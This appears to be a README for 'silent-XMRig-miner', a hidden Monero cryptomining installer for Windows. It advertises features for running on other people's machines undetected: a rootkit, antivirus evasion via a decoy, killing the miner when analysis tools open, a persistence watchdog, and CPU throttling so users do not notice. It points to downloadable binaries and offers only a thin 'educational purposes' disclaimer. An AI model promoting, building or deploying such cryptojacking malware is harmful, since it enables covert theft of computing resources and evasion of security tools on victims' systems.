# silent-XMRig-miner

A free silent (hidden) XMRig installer, capable of installing XMRig miner for silent mining.

This miner can do any CPU alghorithm that XMRig v6.19.1 can, as essentilly it is a wrapping of it.

# The silent-XMRig-miner is capable of:
- Native C/C++ - Miner installer and watchdog coded fully in C++ with no run requirements except a 64-bit Windows OS
- Restricted Mining - Can be configured to mine at different CPU usages to do not bother PC user
- Gentle RAM mode - uses "light" mode if systes has low ram
- Multiple pools - can be configured to use specified multiple pools according to time zones to get lower ping
- Multiple addresses - allows to set multiple addresses in case one is banned
- Stealth - Kills the miner and clears the RAM while any processes analysis tools are open
- Watchdog - Monitors the miner file, miner process and startup entry and restores the miner if anything is removed or killed
- Delayed install - Watchdog installs miner only after specified wait time
- Windows Defender Exclusions - Does not need to be added to exclusions as it is even silent for AVs by using a decoy
- Rootkit - Has a built-in rootkit that fully hides the miner and watchdog

# How to start
- You can download binaries from [releases](https://github.com/operationalguy/silent-XMRig-miner/releases) page
- You can download the repository and use already built binaries
- If you do not trust, you can build SilentMinerConfigurator from sources using Visual Studio

# SilentMinerConfigurator description

# SilentMinerConfigurator instructions

# silent-XMRig-miner dll

# How silent-XMRig-miner works

# Repository contents

- ./SilentMinerConfigurator - GUI application in C++ which is used to configure silent-XMRig-miner installers executable and dll
- ./Binaries - Directory contains unconfigured silent-XMRig-miner installer as executable and dll and also SilentMinerConfigurator binary
- ./libs - C++ code that is shared with XMRig wrapper and SilenMinerConfigurator

# Fees

The miner is configured in a way that every time silent-XMRig-miner starts it randoms a number between 0 and 7, and if the result is 0, it mines for developers untill restarted. So the fee is ~ 1/8. 

# Disclaimer

We, the creators, are not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the abov

# License

This project is licensed under the MIT License

# Support

- Best support is to report any bugs you have found so we can fx them
- Another way is to spread word about us
- If you would like to donate, we accept only Monero, the address is below:
XMR:
45FwrJ3gK8CYgkzBAn5Pga1huGKEuBhySWbZ9TXTZwjkfmjjp95aivrW9MdjaV9n1cSdU2KDcY7gq43uvobHvGLARkQfedy
